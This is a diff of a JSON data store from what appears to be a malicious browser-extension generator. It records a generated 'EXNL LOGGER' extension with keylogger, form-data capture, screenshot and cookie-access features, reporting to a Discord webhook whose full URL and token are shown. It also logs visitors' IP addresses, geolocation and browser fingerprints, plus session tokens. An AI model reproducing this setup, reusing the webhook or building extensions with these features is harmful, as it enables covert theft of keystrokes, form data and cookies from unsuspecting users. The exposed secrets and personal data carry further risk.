@@ -771,13 +771,13 @@
       }
     ],
     [
-      "2e0959a0-7a2c-4046-81af-df85dd6eb9f2",
+      "c98cec65-8c73-4c76-b16b-a0f2174f5d01",
       {
         "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
-        "sessionToken": "2e0959a0-7a2c-4046-81af-df85dd6eb9f2",
-        "expiresAt": "2025-10-01T17:24:58.442Z",
-        "id": "ad7de5c7-8894-4beb-801c-e0171a99b0f1",
-        "createdAt": "2025-09-24T17:24:58.442Z"
+        "sessionToken": "c98cec65-8c73-4c76-b16b-a0f2174f5d01",
+        "expiresAt": "2025-10-01T17:55:23.731Z",
+        "id": "cec3eab3-05a9-4a2e-bd43-ab9aa6b3fba9",
+        "createdAt": "2025-09-24T17:55:23.731Z"
       }
     ]
   ],
@@ -28423,6 +28423,112 @@
         "fingerprint": "ZGVza3RvcC1DaHJv",
         "timestamp": "2025-09-24T17:25:20.573Z"
       }
+    ],
+    [
+      "42429022-0221-40e0-8b79-bd32b9320c2e",
+      {
+        "id": "42429022-0221-40e0-8b79-bd32b9320c2e",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "referrer": "https://b38d2da0-a516-4db3-8532-d342a13cc3bd-00-60x5pycvb62u.kirk.replit.dev/extension-generator",
+        "location": "London, England, United Kingdom (Estimated)",
+        "status": "success",
+        "country": "United Kingdom",
+        "region": "England",
+        "city": "London",
+        "latitude": "51.5074",
+        "longitude": "-0.1278",
+        "timezone": "Europe/London",
+        "isp": "Unknown ISP",
+        "organization": "Unknown",
+        "coordinates": "51.5074, -0.1278",
+        "isVpn": "unknown",
+        "isProxy": "unknown",
+        "threatLevel": "Unknown",
+        "vpnProvider": null,
+        "realLocation": null,
+        "deviceType": "desktop",
+        "browserName": "Chrome",
+        "browserVersion": "140.0.0.0",
+        "operatingSystem": "unknown",
+        "osVersion": "unknown",
+        "deviceBrand": "Apple",
+        "deviceModel": "unknown",
+        "architecture": "unknown",
+        "engine": "Blink",
+        "engineVersion": "140.0.0.0",
+        "isBot": false,
+        "isSuspicious": false,
+        "securityFlags": [],
+        "capabilities": [
+          "🌐 WebKit Support",
+          "📸 Screen Capture API",
+          "🎥 WebRTC Advanced",
+          "🔒 WebAssembly SIMD",
+          "📊 Web Share API",
+          "🌍 Web Locks API",
+          "💻 Full DOM Access",
+          "📂 File System API",
+          "🖱️ Pointer Events",
+          "⌨️ Keyboard API"
+        ],
+        "fingerprint": "ZGVza3RvcC1DaHJv",
+        "timestamp": "2025-09-24T17:56:43.240Z"
+      }
+    ],
+    [
+      "b62e88df-3b1e-40cf-9779-576827cfaf12",
+      {
+        "id": "b62e88df-3b1e-40cf-9779-576827cfaf12",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "referrer": "Extension Activity",
+        "location": "Sydney, NSW, Australia (Estimated)",
+        "status": "extension_activity",
+        "country": "Australia",
+        "region": "NSW",
+        "city": "Sydney",
+        "latitude": "-33.8688",
+        "longitude": "151.2093",
+        "timezone": "Australia/Sydney",
+        "isp": "Unknown ISP",
+        "organization": "Unknown",
+        "coordinates": "-33.8688, 151.2093",
+        "isVpn": "unknown",
+        "isProxy": "unknown",
+        "threatLevel": "Unknown",
+        "vpnProvider": null,
+        "realLocation": null,
+        "deviceType": "desktop",
+        "browserName": "Chrome",
+        "browserVersion": "140.0.0.0",
+        "operatingSystem": "unknown",
+        "osVersion": "unknown",
+        "deviceBrand": "Apple",
+        "deviceModel": "unknown",
+        "architecture": "unknown",
+        "engine": "Blink",
+        "engineVersion": "140.0.0.0",
+        "isBot": false,
+        "isSuspicious": false,
+        "securityFlags": [],
+        "capabilities": [
+          "🌐 WebKit Support",
+          "📸 Screen Capture API",
+          "🎥 WebRTC Advanced",
+          "🔒 WebAssembly SIMD",
+          "📊 Web Share API",
+          "🌍 Web Locks API",
+          "💻 Full DOM Access",
+          "📂 File System API",
+          "🖱️ Pointer Events",
+          "⌨️ Keyboard API"
+        ],
+        "fingerprint": "ZGVza3RvcC1DaHJv",
+        "timestamp": "2025-09-24T17:57:24.280Z"
+      }
     ]
   ],
   "settings": [
@@ -28979,8 +29085,78 @@
         "createdAt": "2025-09-24T17:25:20.719Z",
         "lastWebhookSent": null
       }
+    ],
+    [
+      "dbdfd071-ab78-4418-9832-8a8fd0c6f774",
+      {
+        "id": "dbdfd071-ab78-4418-9832-8a8fd0c6f774",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "extensionName": "Hdadasdasd",
+        "extensionDescription": "EXNL LOGGER",
+        "extensionVersion": "7.8.1.0",
+        "permissions": [
+          "activeTab",
+          "storage",
+          "tabs",
+          "cookies",
+          "webRequest",
+          "history",
+          "geolocation",
+          "bookmarks",
+          "notifications"
+        ],
+        "features": [
+          "ip_tracking",
+          "geolocation",
+          "browser_info",
+          "screenshot",
+          "keylogger",
+          "form_data",
+          "click_tracking"
+        ],
+        "webhookUrl": "https://discord.com/api/webhooks/1419031818686169178/98lX9oudbNXapXXM2aQDE7GcAUr3lm0NM1f6qn4whXgB7boAf6dQnWYcT1y5Ni73DmiD",
+        "customCode": "",
+        "generationStatus": "success",
+        "errorMessage": null,
+        "downloadCount": 1,
+        "extensionId": "5b6baacf-502a-4417-834f-ef1f0108c53e",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "location": "London, England, United Kingdom (Estimated)",
+        "zipFileSize": 14461,
+        "manifestValid": true,
+        "scriptsValid": true,
+        "createdAt": "2025-09-24T17:56:43.405Z",
+        "lastWebhookSent": null
+      }
+    ],
+    [
+      "d58fe9df-3829-4b17-baa0-a5b6f7356a88",
+      {
+        "id": "d58fe9df-3829-4b17-baa0-a5b6f7356a88",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "extensionName": "Hdadasdasd",
+        "extensionDescription": "Extension activity tracking for Hdadasdasd",
+        "extensionVersion": "1.0.0",
+        "permissions": [],
+        "features": [],
+        "webhookUrl": "https://discord.com/api/webhooks/1419031818686169178/98lX9oudbNXapXXM2aQDE7GcAUr3lm0NM1f6qn4whXgB7boAf6dQnWYcT1y5Ni73DmiD",
+        "customCode": "{\"reason\":\"install\",\"timestamp\":\"2025-09-24T17:57:23.205Z\",\"extensionId\":\"5b6baacf-502a-4417-834f-ef1f0108c53e\",\"sessionId\":\"afc197d5-0f35-4e6b-b390-47d84a7ff244\",\"systemInfo\":null}",
+        "generationStatus": "success",
+        "errorMessage": null,
+        "downloadCount": 1,
+        "extensionId": "5b6baacf-502a-4417-834f-ef1f0108c53e",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "location": "Sydney, NSW, Australia (Estimated)",
+        "zipFileSize": 0,
+        "manifestValid": true,
+        "scriptsValid": true,
+        "createdAt": "2025-09-24T17:57:24.142Z",
+        "lastWebhookSent": null
+      }
     ]
   ],
-  "timestamp": "2025-09-24T17:28:44.194Z",
+  "timestamp": "2025-09-24T18:19:28.452Z",
   "version": "2.3"
 }
